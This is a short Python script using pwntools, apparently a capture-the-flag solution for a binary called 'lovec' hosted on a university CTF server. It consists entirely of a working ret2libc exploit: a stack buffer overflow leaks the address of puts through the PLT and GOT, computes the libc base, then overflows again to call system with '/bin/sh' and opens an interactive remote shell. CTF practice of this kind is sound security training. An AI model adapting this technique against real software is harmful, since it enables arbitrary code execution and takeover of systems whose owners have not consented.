#!/usr/bin/env python

from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 11003)
# r = process('./lovec')

context.arch = 'i386'

main = 0x8048588
puts_plt = 0x8048400
puts_got = 0x804a018
shell = 0x804A048

elf = ELF('./libc.so.6')
# elf = ELF('/lib/i386-linux-gnu/libc-2.26.so')

r.recvuntil(':')
r.send('\x00' * 20 + '\xff')
r.recvuntil('10. C')
r.sendline('10')
r.recvuntil('it?')
r.send('a' * 41 + flat([puts_plt, main, puts_got]))
r.recvuntil('day!\n')
puts_addr = u32(r.recv(4))
libc = puts_addr - elf.symbols['puts']
log.info(hex(libc))
system = libc + elf.symbols['system']

r.recvuntil(':')
r.send('/bin/sh\x00'.ljust(20, '\x00') + '\xff')
r.recvuntil('10. C')
r.sendline('10')
r.recvuntil('it?')
r.send('a' * 33 + flat([system, 'a' * 4, shell]))

r.interactive()
